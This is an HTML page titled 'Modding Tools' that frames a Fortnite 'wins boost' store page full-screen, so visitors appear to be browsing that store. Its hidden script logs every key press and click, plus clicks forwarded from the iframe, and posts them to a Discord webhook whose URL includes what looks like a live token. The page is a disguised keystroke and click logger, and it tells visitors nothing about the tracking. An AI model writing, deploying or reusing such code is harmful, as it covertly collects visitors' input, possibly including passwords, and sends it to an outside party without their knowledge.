<!DOCTYPE html>
<html lang="en">
<head>
  <title>Modding Tools</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      border: 0;
    }
    .container {
      position: relative;
      width: 100vw;
      height: 100vh;
    }
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      border: none;
      z-index: 2;
    }
  </style>
</head>
<body>

  <div class="container">
    <iframe id="embeddedFrame" src="https://www.messymoddingstore.com/product/fortnite-wins-boost-service-unranked-and-ranked-play-battle-royale-or-reloaded/" frameborder="0"></iframe>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1345254892419289162/kvAcUG3KlpxqjziFmfr2a-kKKNJ-2t9gJWV3_u1TuklNQylDHeibnod9zVW7-V-rlyRK"; // Replace with your actual webhook

    function sendLog(eventType, eventData) {
      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `ðŸ“¢ **Event:** ${eventType}\nðŸ–¥ **Data:** ${JSON.stringify(eventData)}\nâ° **Time:** ${new Date().toISOString()}`
        })
      }).catch(error => {
        console.error("Error sending log:", error);
      });
    }

    // Log clicks anywhere on the document
    document.addEventListener("click", function(event) {
      sendLog("Click (Document)", { x: event.clientX, y: event.clientY });
    });

    // Log key presses
    document.addEventListener("keydown", function(event) {
      sendLog("Key Pressed", { key: event.key });
    });

    // Listen for messages from the iframe if it supports communication
    window.addEventListener("message", function(event) {
      if (event.data && event.data.type === "iframeClick") {
        sendLog("Click inside iframe", { x: event.data.x, y: event.data.y });
      }
    });
  </script>

</body>
</html>
